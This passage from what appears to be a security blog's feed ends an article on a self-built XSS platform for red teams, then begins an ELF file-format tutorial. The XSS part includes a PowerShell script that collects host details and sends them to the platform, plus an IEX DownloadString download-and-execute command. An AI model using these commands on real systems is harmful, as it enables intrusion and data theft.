class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(base64.b64decode(<span class="built_in">str</span>(JavaScriptFileData).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#文件内容还要加密</span></span><br><span class="line">                CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)<span class="comment">#写到数据库表中</span></span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: JavaScriptSaveFileName, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)<span class="comment">#返回创建好的文件名</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧&quot;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">403</span>, &#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ErrorLog().Write(<span class="string">&quot;Web_CrossSiteScriptHub_CrossSiteScript_GenerateProject(def)&quot;</span>, e)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;呐呐呐！莎酱被玩坏啦(&gt;^ω^&lt;)&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">169</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用Post请求&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure><ul><li><code>RequestLogRecord</code>和<code>UserOperationLogRecord</code>函数是用户行为判断使用的的</li><li><code>UserInfo().QueryUidWithToken(UserToken)</code>是对用户传入的token进行权限验证的</li><li><code>ErrorLog().Write()</code>是对报错日志进行一个写入操作的，这几个函数都不用去管它，这不在我们的介绍中</li></ul><p>1.首先函数通过判断用户的请求方式</p><p>2.当用户使用POST的时候，进行用户传入<code>project_name</code>、<code>javascript_data</code>、<code>token</code>三个值的获取</p><p>3.通过获取到的<code>token</code>值进行查询用户的UID值</p><p>4.如果UID不为空且传入的<code>javascript_data</code>值不为空，进行文件名生成</p><p>5.当文件名不冲突的时候进行拼接写入到本地，并且传入到数据库中</p><h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><h3 id="设置靶机"><a href="#设置靶机" class="headerlink" title="设置靶机"></a>设置靶机</h3><p>用PHPstudy快速搭建一个受害者机器，利用php来生成一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;分享demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello world&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;hacker by ascotbe&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/8.png" alt="image-20210108144136426"></p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>创建好需要替换掉文本中的ip和项目文件地址这两个参数</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/9.gif" alt="2"></p><h3 id="构建POC"><a href="#构建POC" class="headerlink" title="构建POC"></a>构建POC</h3><p>接着我们在靶机上面添加XSS内容，IP填你的域名或者你后端的地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/10.png" alt="image-20210108160245965"></p><h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/11.gif" alt="3"></p><p>可以看到上图<strong>1.php</strong>文件生成了一个cookie，然后加载了云端的js脚本，最后像云端发送了数据</p><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>其实很多时候当目标机器可以无回显执行命令时使用，我们用的dnslog来获取数据会很慢，还可以通过powershell获取数据</p><h3 id="创建项目-1"><a href="#创建项目-1" class="headerlink" title="创建项目"></a>创建项目</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/12.png" alt="image-20210108170533024"></p><p>这边把js文件内容替换成powershell命令，然后创建项目</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Desktop</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Desktop</span><br><span class="line"><span class="variable">$BIOS</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_BIOS</span><br><span class="line"><span class="variable">$Processor</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Processor | <span class="built_in">Select-Object</span> <span class="literal">-ExcludeProperty</span> <span class="string">&quot;CIM*&quot;</span></span><br><span class="line"><span class="variable">$QuickFixEngineering</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_QuickFixEngineering</span><br><span class="line"><span class="variable">$OperatingSystem</span> =<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_OperatingSystem | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Build*,OSType,ServicePack*</span><br><span class="line"><span class="variable">$LogicalDisk</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_LogicalDisk <span class="literal">-Filter</span> <span class="string">&quot;DriveType=3&quot;</span></span><br><span class="line"><span class="variable">$ComputerSystem</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_ComputerSystem <span class="literal">-Property</span> UserName</span><br><span class="line"><span class="variable">$R</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-URI</span> http://ip/a/项目文件名/?Desktop=<span class="variable">$Desktop</span><span class="string">&quot;&amp;&quot;</span>BIOS=<span class="variable">$BIOS</span><span class="string">&quot;&amp;&quot;</span>Processor=<span class="variable">$Processor</span><span class="string">&quot;&amp;&quot;</span>ComputerSystem=<span class="variable">$ComputerSystem</span><span class="string">&quot;&amp;&quot;</span><span class="variable">$QuickFixEngineering</span>=QuickFixEngineering<span class="string">&quot;&amp;&quot;</span>OperatingSystem=<span class="variable">$OperatingSystem</span><span class="string">&quot;&amp;&quot;</span>LogicalDisk=<span class="variable">$LogicalDisk</span> </span><br></pre></td></tr></table></figure><h3 id="运行演示"><a href="#运行演示" class="headerlink" title="运行演示"></a>运行演示</h3><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http://10.91.212.184:9999/s/eeUZF&quot;)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/13.gif" alt="4"></p><h2 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h2><p>大部分白帽子测试漏洞就是进行一个普通弹窗演示，但是正常打红队，想要获取目标客服的一些信息的时候，由于信任以及网址被WAF拦截等情况，导致各种问题，并且无开源项目</p><p>本文介绍了一个XSS平台从头到尾的诞生，以及利用原理，虽然代码没有具体详细讲解，主要是太过于枯燥，感兴趣的师傅直接看项目源码就能够看懂，几乎是每一行都有注释，项目整体一个大的模块写下来花了小半个月时间，虽然功能不多，但是当时想写一个这个模块的时候，无从下手只能去看网上别人搭建的平台，通过注册抓包看逻辑结构，进行理解。每次动手写东西的时候都能收获许多东西，多学多谢才能从开发的角度去找漏洞。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux ELF格式解析</title>
    <link href="https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/"/>
    <id>https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/</id>
    <published>2020-12-06T15:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2></blockquote><p>在写PE结构解析的时候，以为ELF结构没必要去看文件结构，直到后面做了PWN题发现不是这样的，所有还是学习下ELF结构，然后再写个解析器</p><blockquote><h2 id="常见结构区分"><a href="#常见结构区分" class="headerlink" title="常见结构区分"></a>常见结构区分</h2></blockquote><p>目前，PC平台流行的可执行文件格式（Executable）主要包含如下两种，它们都是<strong>COFF</strong>（Common File Format）格式的变种</p><ul><li>Windows下的<strong>PE</strong>（Portable Executable）</li><li>Linux下的<strong>ELF</strong>（Executable Linkable Format）</li></ul><p><strong>源代码经过编译后但未进行连接的那些中间文件</strong>（Windows的<code>.obj</code>和Linux的<code>.o</code>），它与可执行文件的格式非常相似，所以一般跟可执行文件格式一起采用同一种格式存储。</p><p>其中动态链接库（<strong>DDL，Dynamic Linking Library</strong>）和静态链接库（<strong>Static Linking Library</strong>）的格式都和当前系统对应的可执行文件结构一样</p><ul><li>动态链接库：Windows的<code>.dll</code>、Linux的<code>.so</code></li><li>静态链接库：Windows的<code>.lib</code>、Linux的<code>.a</code></li></ul><blockquote><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2></blockquote><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>ELF文件有三种类型，可以通过ELF Header中的<code>e_type</code>成员进行区分：</p><ul><li><strong>可重定位文件（Relocatable File）</strong>：<code>ETL_REL</code>。一般为<code>.o</code>文件，可以与其他目标文件链接来创建可执行文件或共享目标文件的代码和数据。静态链接库属于可重定位文件</li><li><strong>可执行文件（Executable File）</strong>：<code>ET_EXEC</code>。可以执行的一个程序，此文件规定了exec()如何创建一个程序的进程映像。</li><li>共享目标文件（Shared Object File）：<code>ET_DYN</code>。一般为<code>.so</code>文件。<ul><li>链接器将其与其他可重定位文件、共享目标文件链接成新的目标文件；</li><li>动态链接器（Dynamic Linker）将其与某个可执行文件或其他共享目标文件结合一个可执行文件，创建进程映像。</li></ul></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/ELF/1.png" alt="img"></p><p>如图所示，为ELF文件的基本结构，主要由四部分组成：</p><ul><li>ELF Header</li><li>ELF Program Header Table（或称Program Headers、程序头）</li><li>ELF Section Header Table（或称Section Headers、节头表）</li><li>ELF Section</li></ul><p>从图中，就能看出它们各自的数据结构以及相互之间的索引关系。下面依次介绍。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/ELF/2.png" alt="png"></p><p>段（<code>Segment</code>）与节（<code>Section</code>）的区别在于，段是程序执行的必要组成，当多个目标文件链接成一个可执行文件时，会将相同权限的节合并到一个段中。相比而言，节的粒度更小。</p><hr><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>文件的最开始几个字节给出如何解释文件的提示信息。 这些信息独立于处理器， 也独立于文件中的其余内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT]; <span class="comment">//magic number</span></span><br><span class="line">Elf32_Half e_type;                <span class="comment">//Ojbect file type</span></span><br><span class="line">Elf32_Half e_machine;             <span class="comment">//Architecture</span></span><br><span class="line">Elf32_Word e_version;             <span class="comment">//Object file version </span></span><br><span class="line">Elf32_Addr e_entry;               <span class="comment">//entry point</span></span><br><span class="line">Elf32_Off  e_phoff;               <span class="comment">//程序头内容在文件的偏移量</span></span><br><span class="line">Elf32_off  e_shoff;               <span class="comment">//段头内容在文件的偏移量</span></span><br><span class="line">Elf32_Word e_flags;</span><br><span class="line">Elf32_Half e_ehsize;              <span class="comment">//elf头部大小</span></span><br><span class="line">Elf32_Half e_phentsize;           <span class="comment">//程序头部表格的表项大小</span></span><br><span class="line">Elf32_Half e_phnum;               <span class="comment">//程序头的个数Program header</span></span><br><span class="line">Elf32_Half e_shentsize;           <span class="comment">//节区头部表格的表项大小</span></span><br><span class="line">Elf32_Half e_shnum;               <span class="comment">//段头的个数Section header</span></span><br><span class="line">Elf32_Half e_shstrndx;            <span class="comment">//String段在整个段列表中的索引值</span></span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h4 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h4><h5 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h5><p>数组给出了ELF的一些标识信息，这个数组中不同下标的含义如表所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/ELF/3.png" alt="png"></p><p>这些索引访问包含以下数值的字节：</p><ul><li><p>EI_MAG0 到 EI_MAG3：<strong>魔数（Magic Number）</strong>，标志此文件是一个ELF目标文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称            取值         位置</span><br><span class="line">EI_MAG0        0x7f       e_ident[EI_MAG0]</span><br><span class="line">EI_MAG1        &#x27;E&#x27;        e_ident[EI_MAG1]</span><br><span class="line">EI_MAG2        &#x27;L&#x27;        e_ident[EI_MAG2]</span><br><span class="line">EI_MAG3        &#x27;F&#x27;        e_ident[EI_MAG3]</span><br></pre></td></tr></table></figure></li><li><p>EI_CLASS：标识文件的类别，或者说，容量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称             取值            位置</span><br><span class="line">ELFCLASSNONE     0            非法类别</span><br><span class="line">ELFCLASS32       1            32位目标</span><br><span class="line">ELFCLASS64       2            64位目标</span><br><span class="line">ps:ELFCLASS32支持虚存范围4GB，ELFCLASS64是为64位预留的，不过文件中的其他内容都没有针对64位定义</span><br></pre></td></tr></table></figure></li><li><p>EI_DATA：字节e_ident[EI_DATA] 给出处理器特定数据的数据编码方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">名称            取值              位置</span><br><span class="line">ELFDATANONE     0             非法数据编码</span><br><span class="line">ELFDATA2LSB     1             高位在前</span><br><span class="line">ELFDATA2MSB     2             低位在前</span><br></pre></td></tr></table></figure></li><li><p>EI_VERSION：ELF头部的版本号码，目前此值必须是EV_CURRENT。</p></li><li><p>EI_PAD：标记e_ident中未使用字节的开始，初始化为0。</p></li></ul><hr><h5 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h5><p>目标文件类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">ET_NONE         0         未知目标文件格式</span><br><span class="line">ET_REL          1         可重定位文件</span><br><span class="line">ET_EXEC         2         可执行文件</span><br><span class="line">ET_DYN          3         共享目标文件</span><br><span class="line">ET_CORE         4         Core文件（转储格式）</span><br><span class="line">ET_LOPROC     0xff00      特定处理器文件</span><br><span class="line">ET_HIPROC     0xffff      特定处理器文件</span><br><span class="line">ps:ET_LOPROC和ET_HIPROC之间的取值用来标识与处理器相关的文件格式</span><br></pre></td></tr></table></figure><hr><h5 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h5><p>给出文件的目标体系结构类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">EM_NONE         0           未指定</span><br><span class="line">EM_M32          1           AT&amp;T WE 32100</span><br><span class="line">EM_SPARC        2           SPARC</span><br><span class="line">EM_386          3           Intel 80386</span><br><span class="line">EM_68K          4           Motorola 68000</span><br><span class="line">EM_88K          5           Motorola 88000</span><br><span class="line">EM_860          7           Intel 80860</span><br><span class="line">EM_MIPS         8           MIPS RS3000</span><br><span class="line">ps:其他值都是保留的。特定处理器的ELF名称会使用机器名来进行区分。</span><br></pre></td></tr></table></figure><hr><h5 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h5><p>目标文件版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">  EV_NONE         0           非法版本</span><br><span class="line">  EV_CURRENT      1           当前版本</span><br></pre></td></tr></table></figure><hr><h5 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h5><p>程序入口的虚拟地址，如果目标文件没有程序入口，可以为0</p><hr><h5 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h5><p>程序头部表格（Program Header Table）的偏移量（按字节计算）。如果文件没有程序头部表格，可以为0</p><hr><h5 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h5><p>节区头部表格（Section Header Table）的偏移量（按字节计算）。如果文件没有节区头部表格，可以为0</p><hr><h5 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h5><p>保存与文件相关的，特定于处理器的标志。标志名称采用EF_machine_flag的格式</p><hr><h5 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h5><p>ELF头部的大小（以字节计算）</p><hr><h5 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h5><p>程序头部表格的表项大小（按字节计算）</p><hr><h5 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h5><p>程序头部表格的表项数目。可以为0</p><hr><h5 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h5><p>节区头部表格的表项大小（按字节计算）</p><hr><h5 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h5><p>节区头部表格的表项数目。可以为0</p><hr><h5 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h5><p>节区头部表格中与节区名称字符串表相关的表项的索引。如果文件没有节区名称字符串表，此参数可以为SHN_UNDEF</p><h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux ubuntu 5.4.0-55-generic #61-Ubuntu SMP Mon Nov 9 20:49:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ascotbe@ubuntu:~$ readelf -h /bin/sh</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x5cd0</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          127896 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         13</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         30</span></span><br><span class="line"><span class="string">  Section header string table index: 29</span></span><br></pre></td></tr></table></figure><p>ELF文件结构示意图中定义的<code>ELF_Endr</code>的各个成员的含义与readelf具有对应关系：</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>e_ident</td><td>Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</td></tr><tr><td></td><td>class: ELF64</td></tr><tr><td></td><td>Data: 2’s complement, little endian</td></tr><tr><td></td><td>Version: 1 (current)</td></tr><tr><td></td><td>OS&#x2F;ABI: UNIX - System V</td></tr><tr><td></td><td>ABI Version: 0</td></tr><tr><td>e_type</td><td>Type: DYN (Shared object file)</td></tr><tr><td></td><td>共享目标文件</td></tr><tr><td>e_machine</td><td>Advanced Micro Devices X86-64</td></tr><tr><td></td><td>ELF文件的CPI平台属性</td></tr><tr><td>e_version</td><td>Version: 0x1</td></tr><tr><td></td><td>ELF版本号。一般为常数1</td></tr><tr><td>e_entry</td><td>Entry point address: 0x5cd0</td></tr><tr><td></td><td>入口地址，规定ELF程序的入口虚拟地址，操作系统在加载完该程序后从这个地址开始执行进程的指令。</td></tr><tr><td>e_phoff</td><td>Start of program headers: 64 (bytes into file)</td></tr><tr><td>e_shoff</td><td>Start of section headers: 127896 (bytes into file)</td></tr><tr><td></td><td>Section Header Table 在文件中的偏移</td></tr><tr><td>e_word</td><td>Flags: 0x0</td></tr><tr><td></td><td>ELF标志位，用来标识一些ELF文件平台相关的属性</td></tr><tr><td>e_ehsize</td><td>Size of this header: 64(bytes)</td></tr><tr><td></td><td>ELF Header本身的大小</td></tr><tr><td>e_phentsize</td><td>Size of program headers:56 (bytes)</td></tr><tr><td>e_phnum</td><td>Number of program headers: 13</td></tr><tr><td>e_shentsize</td><td>Size of section headers: 64 (bytes)</td></tr><tr><td></td><td>单个Section Header大小</td></tr><tr><td>e_shnum</td><td>Number of section headers: 30</td></tr><tr><td></td><td>Section Header的数量</td></tr><tr><td>e_shstrndx</td><td>Section header string table index: 29</td></tr><tr><td></td><td>Section Header字符串在Section Header Table中的索引</td></tr></tbody></table><h3 id="ELF-Section-Header-Table"><a href="#ELF-Section-Header-Table" class="headerlink" title="ELF Section Header Table"></a>ELF Section Header Table</h3><p>ELF节头表是一个节头数组。每一个节头都描述了其所对应的节的信息，如节名、节大小、在文件中的偏移、读写权限等。<strong>编译器、链接器、装载器都是通过节头表来定位和访问各个节的属性的。</strong></p><p><code>e_shoff</code>成员给出从文件头到节区头部表格的偏移字节数；<code>e_shnum</code>给出表格中条目数目；<code>e_shentsize</code>给出每个项目的字节数。从这些信息中可以确切地定位节区的具体位置、长度。</p><p>节区头部表格中比较特殊的几个小标如下：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_UNDEF</td><td>0</td><td>标记未定义的、缺失的、不相关的，或者没有含义的节区引用</td></tr><tr><td>SHN_LORESERVE</td><td>0xFF00</td><td>保留索引的下界</td></tr><tr><td>SHN_LOPROC</td><td>0xFF00</td><td>保留给处理器特殊的语义</td></tr><tr><td>SHN_HIPROC</td><td>0xFF1F</td><td>保留给处理器特殊的语义</td></tr><tr><td>SHN_ABS</td><td>0xFFF1</td><td>包含对应引用量的绝对取值。这些值不会被重定位所影响</td></tr><tr><td>SHN_COMMON</td><td>0xFFF2</td><td>相对于此节区定义的符号是公共符号。如FORTRAN中COMMON或者未分配的C外部变量</td></tr><tr><td>SHN_HIRESERVE</td><td>0xFFFF</td><td>保留索引的上界</td></tr></tbody></table><p>介于<code>SHN_LORESERVE</code>和<code>SHN_HIRESERVE</code>之间的表项不会出现在节区头部表中。</p><p>每个节区头部可用如下数据结构描述:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;      <span class="comment">//给出节区名称。是节区头部字符串节区（Section Header String Table Section）的索引。名字是一个NULL结尾的字符串，保存在一个名为.shstrtab的字符串表（可通过Section Header索引到）</span></span><br><span class="line">    Elf32_Word sh_type;      <span class="comment">//节类型。为节区的内容和语义进行分类。</span></span><br><span class="line">    Elf32_Word sh_flags;     <span class="comment">//节标志位。节区支持1位形式的标志，这些标志描述了多种属性</span></span><br><span class="line">    Elf32_Addr sh_addr;      <span class="comment">//节的虚拟地址。如果节区将出现在进程的内存映像中或可被加载，则sh_addr为该节被加载后在进程地址空间中的虚拟地址，给出节区的每一个字节应处的位置。否则，此字段为0</span></span><br><span class="line">    Elf32_Off sh_offset;     <span class="comment">//节偏移。如果该节存在于文件中，则该节表示在文件中的偏移；否则无意义，如sh_offset对于BSS节来说就是没有意义的。即此成员的取值给出节区的第一个字节与文件头之间的偏移。</span></span><br><span class="line">    Elf32_Word sh_size;      <span class="comment">//节大小。此成员给出节区的长度（字节数）。除非节区的类型是SHT_NOBITS，否则节区占用文件中的sh_size字节。</span></span><br><span class="line">    Elf32_Word sh_link;      <span class="comment">//节链接信息。此成员给出节区头部表索引链接，其解释依赖于节区类型</span></span><br><span class="line">    Elf32_Word sh_info;      <span class="comment">//节链接信息。此成员给出附加信息，其解释依赖于节区类型</span></span><br><span class="line">    Elf32_Word sh_addralign; <span class="comment">//节地址对齐方式。某些节区带有地址对齐约束。</span></span><br><span class="line">    Elf32_Word sh_entsize;   <span class="comment">//节项大小。某些节区中包含固定大小的项目，如符号表，其包含的每个符号所在的大小都一样。</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>注意：索引为零（SHN_UNDFF）的节区头部也是存在的，尽管此索引标记的是未定义的节区引用，并且节区的内容固定</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/ELF/4.png" alt="png"></p><h4 id="部分字段解析"><a href="#部分字段解析" class="headerlink" title="部分字段解析"></a>部分字段解析</h4><h5 id="sh-type"><a href="#sh-type" class="headerlink" 